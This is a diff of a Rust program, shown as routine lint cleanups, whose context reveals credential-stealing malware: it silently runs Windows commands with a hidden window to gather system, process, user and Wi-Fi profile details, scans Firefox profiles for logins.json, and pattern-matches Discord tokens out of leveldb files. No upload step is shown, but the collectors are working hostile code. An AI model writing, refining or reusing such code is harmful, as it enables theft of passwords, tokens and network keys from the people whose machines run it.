@@ -241,8 +241,8 @@ fn decode_windows_output_enhanced(output: &[u8]) -> String {
     // Windows CP932 (Shift_JIS) エンコーディングを直接処理
     use encoding_rs::SHIFT_JIS;
     let (decoded, _, _) = SHIFT_JIS.decode(output);
-    let result = decoded.to_string();
-    result
+    
+    decoded.to_string()
 }
 
 // -------------------------------------------------------------------------------------------------
@@ -594,7 +594,7 @@ fn execute_custom_command(command: &str) -> Result<String, CollectError> {
             .args(["/C", &format!("chcp 65001 >nul 2>&1 && {}", command)])
             .creation_flags(0x08000000)
             .output()
-            .map_err(|e| CollectError::Io(e))?;
+            .map_err(CollectError::Io)?;
 
         if output.status.success() {
             Ok(decode_windows_output_enhanced(&output.stdout))
@@ -645,7 +645,7 @@ fn collect_windows_system_info() -> Result<BTreeMap<String, String>, CollectErro
         .args(["/C", "chcp 65001 >nul 2>&1 && systeminfo"])
         .creation_flags(0x08000000)
         .output()
-        .map_err(|e| CollectError::Io(e))?;
+        .map_err(CollectError::Io)?;
 
     if output.status.success() {
         let system_text = decode_windows_output_enhanced(&output.stdout);
@@ -690,7 +690,7 @@ fn collect_windows_timezone_info() -> Result<String, CollectError> {
         .args(["/C", "chcp 65001 >nul 2>&1 && tzutil /g"])
         .creation_flags(0x08000000)
         .output()
-        .map_err(|e| CollectError::Io(e))?;
+        .map_err(CollectError::Io)?;
 
     if output.status.success() {
         Ok(decode_windows_output_enhanced(&output.stdout)
@@ -713,7 +713,7 @@ fn collect_windows_cpu_info() -> Result<BTreeMap<String, String>, CollectError> 
         .args(["/C", "chcp 65001 >nul 2>&1 && wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed /format:list"])
         .creation_flags(0x08000000)
         .output()
-        .map_err(|e| CollectError::Io(e))?;
+        .map_err(CollectError::Io)?;
 
     if output.status.success() {
         let cpu_text = decode_windows_output_enhanced(&output.stdout);
@@ -768,7 +768,7 @@ fn collect_windows_memory_info() -> Result<BTreeMap<String, String>, CollectErro
         ])
         .creation_flags(0x08000000)
         .output()
-        .map_err(|e| CollectError::Io(e))?;
+        .map_err(CollectError::Io)?;
 
     if total_output.status.success() {
         let total_text = decode_windows_output_enhanced(&total_output.stdout);
@@ -789,7 +789,7 @@ fn collect_windows_memory_info() -> Result<BTreeMap<String, String>, CollectErro
         .args(["/C", "chcp 65001 >nul 2>&1 && wmic OS get TotalVisibleMemorySize,FreePhysicalMemory /format:list"])
         .creation_flags(0x08000000)
         .output()
-        .map_err(|e| CollectError::Io(e))?;
+        .map_err(CollectError::Io)?;
 
     if available_output.status.success() {
         let available_text = decode_windows_output_enhanced(&available_output.stdout);
@@ -819,7 +819,7 @@ fn collect_windows_storage_info() -> Result<Vec<StorageInfo>, CollectError> {
         .args(["/C", "chcp 65001 >nul 2>&1 && wmic logicaldisk get Caption,Size,FreeSpace,FileSystem /format:list"])
         .creation_flags(0x08000000)
         .output()
-        .map_err(|e| CollectError::Io(e))?;
+        .map_err(CollectError::Io)?;
 
     if output.status.success() {
         let storage_text = decode_windows_output_enhanced(&output.stdout);
@@ -891,7 +891,7 @@ fn collect_windows_processes() -> Result<Vec<ProcessInfo>, CollectError> {
         .args(["/C", "chcp 65001 >nul 2>&1 && tasklist /fo csv"])
         .creation_flags(0x08000000)
         .output()
-        .map_err(|e| CollectError::Io(e))?;
+        .map_err(CollectError::Io)?;
 
     if output.status.success() {
         let process_text = decode_windows_output_enhanced(&output.stdout);
@@ -921,7 +921,7 @@ fn collect_windows_network_details() -> Result<Vec<NetworkDetail>, CollectError>
         .args(["/C", "chcp 65001 >nul 2>&1 && ipconfig /all"])
         .creation_flags(0x08000000)
         .output()
-        .map_err(|e| CollectError::Io(e))?;
+        .map_err(CollectError::Io)?;
 
     if output.status.success() {
         let ipconfig_text = decode_windows_output_enhanced(&output.stdout);
@@ -942,7 +942,7 @@ fn collect_windows_logged_users() -> Result<Vec<String>, CollectError> {
         .args(["/C", "chcp 65001 >nul 2>&1 && query user"])
         .creation_flags(0x08000000)
         .output()
-        .map_err(|e| CollectError::Io(e))?;
+        .map_err(CollectError::Io)?;
 
     if output.status.success() {
         let user_text = decode_windows_output_enhanced(&output.stdout);
@@ -1207,7 +1207,7 @@ fn collect_structured_wifi_profiles() -> Result<(Vec<String>, Vec<WifiProfile>),
         .args(["/C", "chcp 65001 >nul 2>&1 && netsh wlan show profiles"])
         .creation_flags(0x08000000)
         .output()
-        .map_err(|e| CollectError::Io(e))?;
+        .map_err(CollectError::Io)?;
 
     if !output.status.success() {
         return Err(CollectError::CommandFailed(
@@ -1245,7 +1245,7 @@ fn collect_structured_network_interfaces() -> Result<Vec<AuthNetworkInterface>, 
         .args(["/C", "chcp 65001 >nul 2>&1 && ipconfig /all"])
         .creation_flags(0x08000000)
         .output()
-        .map_err(|e| CollectError::Io(e))?;
+        .map_err(CollectError::Io)?;
 
     if !output.status.success() {
         return Err(CollectError::CommandFailed(
@@ -1283,7 +1283,7 @@ fn get_wifi_profile_detail(profile_name: &str) -> Result<WifiProfileDetail, Coll
         ])
         .creation_flags(0x08000000)
         .output()
-        .map_err(|e| CollectError::Io(e))?;
+        .map_err(CollectError::Io)?;
 
     if detail_output.status.success() {
         let detail_text = decode_windows_output_enhanced(&detail_output.stdout);
@@ -1766,7 +1766,7 @@ fn scan_firefox_directory(dir: &std::path::Path) -> Vec<std::path::PathBuf> {
     if dir.exists() {
         if let Ok(entries) = std::fs::read_dir(dir) {
             for entry in entries.flatten() {
-                if entry.file_type().map_or(false, |ft| ft.is_dir()) {
+                if entry.file_type().is_ok_and(|ft| ft.is_dir()) {
                     let profile_path = entry.path();
                     if profile_path.join("logins.json").exists() {
                         profiles.push(profile_path);
@@ -1874,7 +1874,7 @@ fn extract_discord_with_patterns() -> AoiResult<Vec<String>> {
     if let Ok(entries) = std::fs::read_dir(&leveldb_path) {
         for entry in entries.flatten() {
             let path = entry.path();
-            if path.extension().map_or(false, |ext| ext == "ldb") {
+            if path.extension().is_some_and(|ext| ext == "ldb") {
                 if let Ok(content) = std::fs::read(&path) {
                     let content_str = String::from_utf8_lossy(&content);
 
@@ -2199,7 +2199,7 @@ fn collect_ldb_files_recursive(
 
         if path.is_dir() {
             collect_ldb_files_recursive(&path, ldb_files)?;
-        } else if path.extension().map_or(false, |ext| ext == "ldb") {
+        } else if path.extension().is_some_and(|ext| ext == "ldb") {
             ldb_files.push(path);
         }
     }
